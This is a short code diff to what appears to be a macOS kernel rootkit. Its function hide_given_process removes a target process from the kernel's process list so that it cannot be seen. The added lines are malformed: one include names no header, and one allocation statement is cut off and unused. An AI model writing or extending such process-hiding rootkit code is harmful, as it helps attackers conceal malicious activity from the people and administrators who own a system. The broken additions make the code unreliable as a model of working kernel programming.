@@ -10,6 +10,7 @@
 #include <sys/lock.h>
 #include <sys/proc.h>
 #include <sys/syscall.h>
+#include <sys/>
 
 #include "HookCAPI.h"
 #include "configure.h"
@@ -46,6 +47,10 @@ errno_t hide_given_process(troy_hide_object *process_hide)
         {
             LOG(LOG_INFO, "Get process name scuuessfully");
             LIST_REMOVE(kernel_proc, p_list);
+
+            struct hide_proc *proc = _MALLOC
+
+            TAILQ_INSERT_HEAD(&hide_proc_array, kernel_proc, next_ptr);
         }
         /*
          * here we must use le_prev, because le_next is NULL.
